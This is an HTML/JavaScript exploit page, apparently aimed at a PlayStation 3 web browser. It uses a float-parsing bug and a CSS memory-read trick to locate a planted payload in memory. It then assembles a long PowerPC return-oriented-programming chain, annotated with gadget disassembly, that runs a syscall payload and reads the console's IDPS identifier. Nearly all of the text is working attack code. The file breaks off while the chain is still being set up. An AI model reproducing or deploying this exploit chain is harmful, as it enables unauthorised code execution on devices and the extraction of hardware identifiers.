<html>
<script src="include/jquery.js"></script>
<script src="include/utils.js"></script>
<script src="include/IEEE754.js"></script>
<head>
<script>

//var blr = unescape("\u4E80\u0020");
//var mtspr = unescape("\u7C08\u03A6");
//var nop = unescape("\u6000\u0000");

function Repeat(s, n)
{
	var a = [];
	
	while(a.length < n)
	{
		a.push(s);
	}
	return a.join('');
}

function readMemory(address, size)
{
	var exploit = document.getElementById('exploit');
	exploit.style.src = 'local(' + generateExploit(address, size) + ')';
	return exploit.style.src;
}

function hexh2bin(hex_val)
{
	var str = "";
	var half = hex_val & 0xFFFF;
	
	// get hex
	str = half.toString(16);
	
	// pad as needed
	if (str.length < 3)
	{
		str = "%" + Repeat("0", 2 - str.length) + str;
	}
	else
	{
		str = "%u" + Repeat("0", 4 - str.length) + str;;
	}
	
	return unescape(str);
}

// Usage: bin2unescape(str, 4);
function bin2unescape(str, n) {
   var a = [], start=0;
   while(start<str.length) {
	  if (a === "\0") {
		  str.replace("\0", "\\0");
	  }
      a.push(str.slice(start, start+n));
      start+=n;
   }
   return (a.join("" + "\\u"));
}

String.prototype.replaceAt=function(index, char) 
{
	return this.substr(0, index) + char + this.substr(index+char.length);
}

function findExploit(name,exploit_data,pattern,len)
{
	try
	{
		var search_base = 0x80150000;
		var search_size = 0x450000;
		
		var dat = readMemory(search_base, search_size);
		
		// move past "local("
		dat = dat.substr(6, search_size);
		
		// loop for tag
		for (var i = 0; i < (search_size*2); i += 0x10)
		//for (var i = 0; i < (20000*0x10); i += 0x8)
		{
			//if (i > 20000*0x10) {return 0;}
			if (dat.charCodeAt(i/2) == pattern)
			{
				var match = 0;
				
				// loop next 5 bits
				for (var k = 0; k < len; k+=2)
				{
					// convert to string
					if (dat.charCodeAt((i+k)/2) != exploit_data.charCodeAt(k/2))
					{
						break;
					}
					// increment match
					match += 2;
				}
				
				// we got a complete match
				if (match == len)
				{
					// hold exploit addr
					var exploit_addr = search_base + i + 2;
					
					// display the exploit address
					dbg("Found " + name + " at: " + exploit_addr.toString(16));
					//dbg("Loop: "+(i/0x10));
					dat=null;
					return exploit_addr;
				}
			}
		}
		dat=null;
		dbg("The string variable named " + name + " could not be located in the search range.");
		return 0;
	} 
	catch(e) 
	{
		dbg(e);
	}
}

function trigger(exploit_addr)
{
	// dump data
	var span = document.createElement("div");
	document.getElementById("BodyID").appendChild(span);
	span.innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
}

function initROP(){
	
	try
	{
		var gadget,jump_2,jump_1,g,j1,j2;
		var payload;
		var payload_addr=0;		
		var gadget_addr=0;
		var jump_1_addr=0;
		var jump_2_addr=0;


		//gadget =  unescape("\u7E2F\u006F\uC0F0\u7E2F"); //for DEX - libc memcpy
		//gadget =  unescape("\u7E2F\u000C\u6730\u7E2F"); //for DEX - 3 beeps + shutdown
		//gadget =  unescape("\u7E2F\u000C\u5234\u7E2F"); //for CEX - 3 beeps + shutdown
		//gadget =  unescape("\u7E2F\u0044\uE8CC\u7E2F"); //for DEX - 3 beeps + freeze
		//gadget =  unescape("\u7E2F\u0044\u6CD8\u7E2F"); //for CEX - 3 beeps + freeze

	// gadget 1 =  unescape("\u7E2F\u0009\u76BC\u7E2F"); 	//seg001:0000000000010B30                 mr        r1, r11
															//seg001:0000000000010B34                 blr
	// same cex/dex in dump

		
	// gadget 2 =  unescape("\u7E2F\u01C6\u324C\u7E2F");	// The following gadget will basically set r28, r29 & r31 to use in next gadget
															//
															<!-- 01C6324C E8010130 ld         r0,0x130(r1)                   PIPE -->
	//E801013081810128->0x5C7324C  same cex/dex in dump		<!-- 01C63250 81810128 lwz        r12,0x128(r1) -->
															<!-- 01C63254 80610070 lwz        r3,0x70(r1)                    PIPE -->
															<!-- 01C63258 7C0803A6 mtspr      lr,r0 -->
															<!-- 01C6325C E9C10090 ld         r14,0x90(r1) -->
															<!-- 01C63260 7D908120 mtocrf     0x08,r12 -->
															<!-- 01C63264 E9E10098 ld         r15,0x98(r1) -->
															<!-- 01C63268 EA0100A0 ld         r16,0xA0(r1) -->
															<!-- 01C6326C EA2100A8 ld         r17,0xA8(r1)                   PIPE -->
															<!-- 01C63270 EA4100B0 ld         r18,0xB0(r1) -->
															<!-- 01C63274 EA6100B8 ld         r19,0xB8(r1)                   PIPE -->
															<!-- 01C63278 EA8100C0 ld         r20,0xC0(r1) -->
															<!-- 01C6327C EAA100C8 ld         r21,0xC8(r1)                   PIPE -->
															<!-- 01C63280 EAC100D0 ld         r22,0xD0(r1) -->
															<!-- 01C63284 EAE100D8 ld         r23,0xD8(r1)                   PIPE -->
															<!-- 01C63288 EB0100E0 ld         r24,0xE0(r1) -->
															<!-- 01C6328C EB2100E8 ld         r25,0xE8(r1)                   PIPE -->
															<!-- 01C63290 EB4100F0 ld         r26,0xF0(r1) -->
															<!-- 01C63294 EB6100F8 ld         r27,0xF8(r1)                   PIPE -->
															<!-- 01C63298 EB810100 ld         r28,0x100(r1) -->
															<!-- 01C6329C EBA10108 ld         r29,0x108(r1)                  PIPE -->
															<!-- 01C632A0 EBC10110 ld         r30,0x110(r1) -->
															<!-- 01C632A4 EBE10118 ld         r31,0x118(r1)                  PIPE -->
															<!-- 01C632A8 38210120 addi       r1,r1,0x120 -->
															<!-- 01C632AC 4E800020 blr				 -->
															//
															// not used
															<!-- 006161B8 81610074 lwz        r11,0x74(r1) -->
															<!-- 006161BC 81410078 lwz        r10,0x78(r1)                   PIPE -->
															<!-- 006161C0 8101007C lwz        r8,0x7C(r1) -->
															<!-- 006161C4 80E10080 lwz        r7,0x80(r1)                    PIPE -->
															<!-- 006161C8 80C10084 lwz        r6,0x84(r1) -->
															//
	// gadget 3 =  unescape("\u7E2F\u0061\u61CC\u7E2F");	// Gadget 3 Start here   this gadget will set r3, r4 & r5
		// tested same dex/cex offset in dump				
															<!-- 006161CC 80A10088 lwz        r5,
															<!-- 006161D0 8081008C lwz        r4,0x8C(r1) -->
															<!-- 006161D4 80610090 lwz        r3,0x90(r1)                    PIPE -->
															<!-- 006161D8 81210094 lwz        r9,0x94(r1) -->
															<!-- 006161DC 80010070 lwz        r0,0x70(r1)                    PIPE -->
															<!-- 006161E0 913F0024 stw        r9,0x24(r31) -->
															<!-- 006161E4 901F0000 stw        r0,0x0(r31)                    PIPE -->
															<!-- 006161E8 917F0004 stw        r11,0x4(r31) -->
															<!-- 006161EC 915F0008 stw        r10,0x8(r31)                   PIPE -->
															<!-- 006161F0 911F000C stw        r8,0xC(r31) -->
															<!-- 006161F4 90FF0010 stw        r7,0x10(r31)                   PIPE -->
															<!-- 006161F8 90DF0014 stw        r6,0x14(r31) -->
															<!-- 006161FC 90BF0018 stw        r5,0x18(r31)                   PIPE -->
															<!-- 00616200 909F001C stw        r4,0x1C(r31) -->
															<!-- 00616204 907F0020 stw        r3,0x20(r31)                   PIPE -->
															<!-- 00616208 E80100D0 ld         r0,0xD0(r1) -->
															<!-- 0061620C 7FA307B4 extsw      r3,r29 -->
															<!-- 00616210 EBC100B0 ld         r30,0xB0(r1) -->
															<!-- 00616214 EBA100A8 ld         r29,0xA8(r1)                   PIPE -->
															<!-- 00616218 7C0803A6 mtspr      lr,r0 -->
															<!-- 0061621C EBE100B8 ld         r31,0xB8(r1) -->
															<!-- 00616220 382100C0 addi       r1,r1,0xC0 -->
															<!-- 00616224 4E800020 blr -->
															
															//loads the memcpy address into lr and execute the memcopy then load payload offset in lr for execution
	// gadget 4 =  unescape("\u7E2F\u0001\u4660\u7E2F");	// Gadget 4 here
															<!-- 00014660 486045C5 bl         0x00618C24  -->
															<!-- 00014664 		   nop					 -->
															<!-- 00014668          li         r9, 1 	-->
															<!-- 0001466C          b          0x0001449C -->
															<!-- 0001449C E80100F0 ld         r0,0xF0(r1)                    PIPE -->
															<!-- 000144A0 7D2307B4 extsw      r3,r9 -->
															<!-- 000144A4 EAA10088 ld         r21,0x88(r1) -->
															<!-- 000144A8 EAC10090 ld         r22,0x90(r1) -->
															<!-- 000144AC 7C0803A6 mtspr      lr,r0 -->
															<!-- 000144B0 EAE10098 ld         r23,0x98(r1) -->
															<!-- 000144B4 EB0100A0 ld         r24,0xA0(r1)                   PIPE -->
															<!-- 000144B8 EB2100A8 ld         r25,0xA8(r1) -->
															<!-- 000144BC EB4100B0 ld         r26,0xB0(r1)                   PIPE -->
															<!-- 000144C0 EB6100B8 ld         r27,0xB8(r1) -->
															<!-- 000144C4 EB8100C0 ld         r28,0xC0(r1)                   PIPE -->
															<!-- 000144C8 EBA100C8 ld         r29,0xC8(r1) -->
															<!-- 000144CC EBC100D0 ld         r30,0xD0(r1)                   PIPE -->
															<!-- 000144D0 EBE100D8 ld         r31,0xD8(r1) -->
															<!-- 000144D4 382100E0 addi       r1,r1,0xE0 -->
															<!-- 000144D8 4E800020 blr -->
															
															// Payload -  buzzer root syscall
															//38601004 3880000A 38A001B6 39600188 44000002 4E800020
															//00010000 38601004 li         r3,0x1004
															//00010004 3880000A li         r4,0xA                         PIPE
															//00010008 38A001B6 li         r5,0x1B6
															//0001000C 39600188 li         r11,0x188                      PIPE
															//00010010 44000002 sc                                       23 CSI
															//00010014 4E800020 blr 												

															//CEX
															//at 0x97604 you should find 7D615B784E800020
															//at 0x1c5324C you should find E801013081810128
															//at 0x568C94  you should find 80A100888081008C80610090
															//at 0x1449C you should find E80100F07D2307B4
															
								
		
		dbg("Processing payload string.. Searching for valid offset....");
		
		do{
		payload =  unescape("\u2F2A\u3860\u1004\u3880\u000A\u38A0\u01B6\u3960\u0188\u4400\u0002\u4E80\u0020\u2F2A"); // 16 total bytes after placeholder placeholder
		payload_addr = findExploit("payload",payload,0x2F2A,0x8);
		}
		while(payload_addr==0);
		
		
		// DEX
		// gadget entry
		// mr        r1, r11
		gadget =  unescape("\u4444\u0009\u76BC");
		
		// padding 36 bytes
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
		
		// r2
		gadget =  gadget+unescape("\u0202\u0202\u0202\u0202");
		
		// padding 80 bytes
		//gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u6262\u6262\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u6161\u6161\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u5959\u5959\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u5858\u5858\u4141\u4141\u4141");
		
		// r30
		gadget =  gadget+unescape("\u3030\u3030\u3030\u3030");
		
		// ???
		gadget =  gadget+unescape("\u3131\u3131\u01F1\u3131");
		
		// padding 16 bytes
		//gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
		gadget =  gadget+unescape("\u4141\u4141\u4141\u6363\u6363\u4141\u4141\u4141"); // 164 total (after 00000000 below) bytes after placeholder & 24 bytes after 0xA0 r1 jump
		
		// gadget #2 address
		// ld         r0,0x130(r1)
		gadget =  gadget+unescape("\u0000\u0000\u01C6\u324C");
		
		//padding 120 bytes
		//gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
		gadget =  gadget+unescape("\u4141\u4141\u6969\u6969\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u6868\u6868\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u6767\u6767\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u6666\u6666\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u6565\u6565\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u6464\u6464\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
		
		// r14
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0140");
		
		// r15
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0150");
		
		// r16
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0160");
		
		// r17
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0170");
		
		// r18
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0180");
		
		// r19
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0190");
		
		// r20
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0200");
		
		// r21
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0210");
		
		// r22
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0220");
		
		// r23
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0230");
		
		// r24
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0240");
		
		// r25
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0250");
		
		// r26
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0260");
		
		// r27
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0270");
		
		// r28
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0280");
		
		// r29
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0290");
		
		// ??? r30 pre1
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0300");
		
		// r31
		gadget =  gadget+unescape("\u0000\u0000\u8060\u0000");
		
		// ???
		gadget =  gadget+unescape("\u01F2\u4141");
		
		// ??? r3 or padding 6 bytes
		gadget =  gadget+unescape("\u4141\u4141");
		
		// r12 last 4 bytes
		gadget =  gadget+unescape("\u8020\u0120");
		
		// padding
		gadget =  gadget+unescape("\u4141\u4141");
		
		// gadget #3 r0 points to address
		gadget =  gadget+unescape("\u0000\u0000\u0061\u61CC");
		
		// padding 8 bytes
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141");//100 bytes & 32 bytes after r1 2nd jump
		
		// padding 70 bytes
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
		
		// ??? matches gadget #4 last 4 bytes
		gadget =  gadget+unescape("\u000C\u3788");
		
		// padding 30 bytes
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
		
		// r5 ???
		gadget =  gadget+unescape("\u0000\u1000\u0404\u0404");
		
		// r29 lower 4 bytes ???
		gadget =  gadget+unescape("\u0001\u0C70");
		
		// r9 ???
		//gadget =  gadget+unescape("\u0909\u0909"); 
		gadget =  gadget+unescape("\u0051\uA390"); // TEST going back to gadget 5 >> 0051A390 E9610080 ld         r11,0x80(r1)
		
		// ??? + padding
		gadget =  gadget+unescape("\u4141\u01F3\u4141\u4141\u4141\u4141\u4141\u4141");//122 bytes [at first set of 4141]
		
		// ??? r29
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0290");
		
		// ??? r30 post1
		//gadget =  gadget+unescape("\u3030\u3030\u3030\u3030");
		gadget =  gadget+unescape("\u0000\u0000\u8000\u0160"); // small 00 area to write
		
		// padding 8 bytes
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141");
		
		// ??? r1+0x0
		gadget =  gadget+unescape("\u01F4\u4141");
		
		// padding 14 bytes
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141");
		
		// gadget #4 8 bytes ORIGINAL
		//gadget =  gadget+unescape("\u0000\u0000\u0001\u4660");
		
		// gadget #4 1st 4 bytes
		// r0 1st 4 bytes and also r1+0x10 after syscall
		gadget =  gadget+unescape("\u0000\u0000");
		
		
		// goto gadget #4 NEW
		/*
		0051A390 E9610080 ld         r11,0x80(r1)
		0051A394 E9210088 ld         r9,0x88(r1)                    PIPE
		0051A398 F81E0000 std        r0,0x0(r30)
		0051A39C F93E0010 std        r9,0x10(r30)                   PIPE
		0051A3A0 F97E0008 std        r11,0x8(r30)
		0051A3A4 E80100C0 ld         r0,0xC0(r1)                    PIPE
		0051A3A8 7C6307B4 extsw      r3,r3
		0051A3AC EB810090 ld         r28,0x90(r1)
		0051A3B0 EBA10098 ld         r29,0x98(r1)
		0051A3B4 7C0803A6 mtspr      lr,r0
		0051A3B8 EBC100A0 ld         r30,0xA0(r1)
		0051A3BC EBE100A8 ld         r31,0xA8(r1)                   PIPE
		0051A3C0 382100B0 addi       r1,r1,0xB0
		0051A3C4 4E800020 blr 
		*/
		gadget =  gadget+unescape("\u0051\uA390");
		
		// padding 28 bytes
		gadget =  gadget+unescape("\u4141\4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");//92 bytes
		
		// ---------------------------------------------------------------------------------------
		// padding 174 bytes ORIGINAL
		//gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
		
		
		// preparing gadget #5
		// padding 174 bytes SPLIT
		gadget =  gadget+unescape("\u4141\u4141\u6161\u6161\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u6262\u6262\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u6363\u6363\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u6464\u6464\u4141\u4141");
		
		gadget =  gadget+unescape("\u0000\u0000\u0000\u0000");// set r0
		gadget =  gadget+unescape("\u0000\u0000\u0000\u0000");// set r9
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0020");// set r28
		
		// Using diff offsets to read 4 bytes at a time
		//gadget =  gadget+unescape("\u0000\u0000\u0073\u5F94"); // IDPS 4 bytes - 0x04 [get bytes C,D,E,F]
		//gadget =  gadget+unescape("\u0000\u0000\u0073\u5F90"); // IDPS 4 bytes - 0x08 [get bytes 8,9,A,B]
		//gadget =  gadget+unescape("\u0000\u0000\u0073\u5F8C"); // IDPS 4 bytes - 0x0C [get bytes 4,5,6,7]
		//gadget =  gadget+unescape("\u0000\u0000\u0073\u5F88"); // IDPS 4 bytes - 0x10 [get bytes 0,1,2,3]
		
		/*
		0035D670 813D00B4 lwz        r9,0xB4(r29) <-- 0x00735EE8 [get bytes C,D,E,F]
		0035D674 817D00B8 lwz        r11,0xB8(r29) <-- 0x00735EEC [get bytes 4,5,6,7]
		0035D678 815D00BC lwz        r10,0xBC(r29) <-- 0x00735EF0 [get bytes 8,9,A,B]
		0035D67C 811D00C0 lwz        r8,0xC0(r29) <-- 
		0035D680 80FD00C4 lwz        r7,0xC4(r29) <-- 
		*/
		gadget =  gadget+unescape("\u0000\u0000\u0073\u5EE8");// set r29 [TEST IDPS base - 0xB4]
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0300");// set r30
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0310");// set r31
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0010");// set r1
		
		// padding
		gadget =  gadget+unescape("\u4141\u5454\u5454\u4141");
		
		
		
		// setup gadget #5
		
		/*
		0035D670 813D00B4 lwz        r9,0xB4(r29)
		0035D674 817D00B8 lwz        r11,0xB8(r29)                  PIPE
		0035D678 815D00BC lwz        r10,0xBC(r29)
		0035D67C 811D00C0 lwz        r8,0xC0(r29)                   PIPE
		0035D680 80FD00C4 lwz        r7,0xC4(r29)
		0035D684 901C00C8 stw        r0,0xC8(r28)                   PIPE
		0035D688 E80100C0 ld         r0,0xC0(r1)
		0035D68C 913C00B4 stw        r9,0xB4(r28)                   PIPE
		0035D690 917C00B8 stw        r11,0xB8(r28)
		0035D694 7C0803A6 mtspr      lr,r0
		0035D698 915C00BC stw        r10,0xBC(r28)
		0035D69C 911C00C0 stw        r8,0xC0(r28)                   PIPE
		0035D6A0 90FC00C4 stw        r7,0xC4(r28)
		0035D6A4 EB010070 ld         r24,0x70(r1)                   PIPE
		0035D6A8 EB210078 ld         r25,0x78(r1)
		0035D6AC EB410080 ld         r26,0x80(r1)                   PIPE
		0035D6B0 EB610088 ld         r27,0x88(r1)
		0035D6B4 EB810090 ld         r28,0x90(r1)                   PIPE
		0035D6B8 EBA10098 ld         r29,0x98(r1)
		0035D6BC 382100B0 addi       r1,r1,0xB0
		0035D6C0 4E800020 blr
		*/
		gadget =  gadget+unescape("\u0000\u0000\u0035\uD670"); // 
		
		// padding
		gadget =  gadget+unescape("\u6868\u6868\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u6969\u6969\u4141\u4141\u4141");
		// ---------------------------------------------------------------------------------------
		
		// padding
		gadget =  gadget+unescape("\u0000\u0000\u0001\u0000");
		
		
		
		// prepare gadget #6
		
		// extended padding to use bigger offsets for setting r0 from r1
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u6D6D\u6D6D\u4141\u4141\u4141\u4141\u4141\u6E6D\u6E6D\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u6E6E\u6E6E\u4141\u4141\u4141");
		// 0035D6A4 EB010070 ld         r24,0x70(r1)
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0240");
		// 0035D6A8 EB210078 ld         r25,0x78(r1)
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0250");
		// 0035D6AC EB410080 ld         r26,0x80(r1)
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0260");
		// 0035D6B0 EB610088 ld         r27,0x88(r1)
		gadget =  gadget+unescape("\u0000\u0000\u0000\u1004");// set value to use for r3 in gadget #9
		// 0035D6B4 EB810090 ld         r28,0x90(r1)
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0280");
		// 0035D6B8 EBA10098 ld         r29,0x98(r1)
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0290");
		// padding
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
		// 0035D6BC 382100B0 addi       r1,r1,0xB0 
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0010");
		// padding
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141");
		
		
		// setup for gadget #6
		// store IDPS to r31
		/*
		0006378C 917F0044 stw        r11,0x44(r31)                  PIPE
		00063790 915F0048 stw        r10,0x48(r31)
		00063794 913F004C stw        r9,0x4C(r31)                   PIPE
		00063798 E80100A0 ld         r0,0xA0(r1)
		0006379C EB810070 ld         r28,0x70(r1)                   PIPE
		000637A0 EBA10078 ld         r29,0x78(r1)
		000637A4 7C0803A6 mtspr      lr,r0
		000637A8 EBC10080 ld         r30,0x80(r1)
		000637AC EBE10088 ld         r31,0x88(r1)                   PIPE
		000637B0 38210090 addi       r1,r1,0x90
		000637B4 4E800020 blr
		*/
		
		gadget =  gadget+unescape("\u0000\u0000\u0006\u378C"); // return address from r1 into r0
		
		// padding
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u6969\u6969\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u6868\u6868\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u6767\u6767\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
		
		
		
		// prepare gadget #7 
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0280");// set r28
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0290");// set r29
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0300");// set r30
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0310");// set r31
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");// padding
		
		
		// setup for gadget #7
		/*
		006161B8 81610074 lwz        r11,0x74(r1)
		006161BC 81410078 lwz        r10,0x78(r1)                   PIPE
		006161C0 8101007C lwz        r8,0x7C(r1)
		006161C4 80E10080 lwz        r7,0x80(r1)                    PIPE
		006161C8 80C10084 lwz        r6,0x84(r1)
		006161CC 80A10088 lwz        r5,0x88(r1)                    PIPE
		006161D0 8081008C lwz        r4,0x8C(r1)
		006161D4 80610090 lwz        r3,0x90(r1)                    PIPE
		006161D8 81210094 lwz        r9,0x94(r1)
		006161DC 80010070 lwz        r0,0x70(r1)                    PIPE
		006161E0 913F0024 stw        r9,0x24(r31)
		006161E4 901F0000 stw        r0,0x0(r31)                    PIPE
		006161E8 917F0004 stw        r11,0x4(r31)
		006161EC 915F0008 stw        r10,0x8(r31)                   PIPE
		006161F0 911F000C stw        r8,0xC(r31)
		006161F4 90FF0010 stw        r7,0x10(r31)                   PIPE
		006161F8 90DF0014 stw        r6,0x14(r31)
		006161FC 90BF0018 stw        r5,0x18(r31)                   PIPE
		00616200 909F001C stw        r4,0x1C(r31)
		00616204 907F0020 stw        r3,0x20(r31)                   PIPE
		00616208 E80100D0 ld         r0,0xD0(r1)
		0061620C 7FA307B4 extsw      r3,r29
		00616210 EBC100B0 ld         r30,0xB0(r1)
		00616214 EBA100A8 ld         r29,0xA8(r1)                   PIPE
		00616218 7C0803A6 mtspr      lr,r0
		0061621C EBE100B8 ld         r31,0xB8(r1)
		00616220 382100C0 addi       r1,r1,0xC0
		00616224 4E800020 blr                                      08
		00616228 8062B140 lwz        r3,-0x4EC0(r2)
		0061622C 48007E95 bl         0x0061E0C0                    08
		00616230 60000000 nop
		00616234 E80100D0 ld         r0,0xD0(r1)
		00616238 EBC100B0 ld         r30,0xB0(r1)
		0061623C 7FA307B4 extsw      r3,r29
		00616240 EBE100B8 ld         r31,0xB8(r1)
		00616244 EBA100A8 ld         r29,0xA8(r1)                   PIPE
		00616248 7C0803A6 mtspr      lr,r0
		0061624C 382100C0 addi       r1,r1,0xC0
		00616250 4E800020 blr
		*/
		
		// re-using gadget #3 but further up
		gadget =  gadget+unescape("\u0000\u0000\u0061\u61B8");// return address from r1 into r0
		
		// padding
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u6363\u6363\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u6262\u6262\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u5959\u5959\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
		
		
		
		// prepare for gadget #8
		
		gadget =  gadget+unescape("\u4141\u4956");// padding
		gadget =  gadget+unescape("\u0000\u0188");// set r11
		gadget =  gadget+unescape("\u8020\u0100");// set r10
		gadget =  gadget+unescape("\u8020\u0080");//set r8
		gadget =  gadget+unescape("\u8020\u0070");//set r7
		gadget =  gadget+unescape("\u8020\u0060");//set r6
		gadget =  gadget+unescape("\u0000\u01B6");//set r5
		gadget =  gadget+unescape("\u0000\u000A");//set r4
		gadget =  gadget+unescape("\u4141\u4141");// padding
		
		gadget =  gadget+unescape("\u8020\u0090");// set r9
		
		// padding
		gadget =  gadget+unescape("\u5A59\u5A59\u4141\u4141\u545D\u545D\u4141\u4141\u4141\u4141\u4141\u445D\u445D\u4141\u4141\u445C\u445C\u4141\u4141\u445B\u445B\u4141\u4141\u445A\u445A\u4141\u4141\u455A");
		
		
		// setup for gadget #8
		
		/*
		000AF96C E80100C0 ld         r0,0xC0(r1)                    PIPE
		000AF970 7F63DB78 mr         r3,r27
		000AF974 EB410080 ld         r26,0x80(r1)
		000AF978 EB610088 ld         r27,0x88(r1)
		000AF97C 7C0803A6 mtspr      lr,r0
		000AF980 EB810090 ld         r28,0x90(r1)
		000AF984 EBA10098 ld         r29,0x98(r1)                   PIPE
		000AF988 EBC100A0 ld         r30,0xA0(r1)
		000AF98C EBE100A8 ld         r31,0xA8(r1)                   PIPE
		000AF990 382100B0 addi       r1,r1,0xB0
		000AF994 4E800020 blr
		*/
		// CTR points to 0x00000000000976BC
		gadget =  gadget+unescape("\u0000\u0000\u000A\uF96C");// return address from r1 into r0
		
		// padding
		gadget =  gadget+unescape("\u4559\u4141\u4141\u4558\u4558\u4141\u4141\u4556\u4556\u4141\u4141\u4569\u4569\u4141\u4141\u4596\u4596\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4A48\u4A48\u4141\u4141\u4141\u4141\u4141\u4141\u4C48\u4C48\u4141\u4141\u4141\u4141\u4B48\u4B48\u4141\u4141\u4141");
		
		
		
		// prepare for gadget #9
		
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0260");// set r26
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0270");//set r27
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0280");//set r28
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0290");//set r29
